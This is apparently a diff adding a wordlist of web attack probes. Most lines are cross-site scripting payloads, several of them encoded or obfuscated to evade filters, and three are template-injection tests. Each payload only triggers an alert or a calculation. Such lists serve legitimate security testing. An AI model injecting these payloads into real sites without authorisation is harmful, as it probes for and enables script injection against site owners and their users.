@@ -1,0 +1,27 @@
+
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+javascript:alert(1)
+<body onload=alert(1)>
+'><script>alert(1)</script>
+"><script>alert(1)</script>
+<iframe src=javascript:alert(1)>
+<input autofocus onfocus=alert(1)>
+{{7*7}}
+${7*7}
+#{7*7}
+<script>alert(document.domain)</script>
+<svg><script>alert&#40;1&#41;</script>
+<img src="x" onerror="alert(String.fromCharCode(88,83,83))">
+<details open ontoggle=alert(1)>
+<marquee onstart=alert(1)>
+<video><source onerror=alert(1)>
+<div style="background:url(javascript:alert(1))">
+<math><mtext></mtext><mtext><img src=x:x onerror=alert(1)></mtext></math>
+<noscript><p title="</noscript><img src=x onerror=alert(1)>
+<script>eval(atob('YWxlcnQoMSk='))</script>
+%3Cscript%3Ealert(1)%3C/script%3E
+%3Cimg+src%3Dx+onerror%3Dalert(1)%3E
+\x3cscript\x3ealert(1)\x3c/script\x3e
+<script>window['al'+'ert'](1)</script>
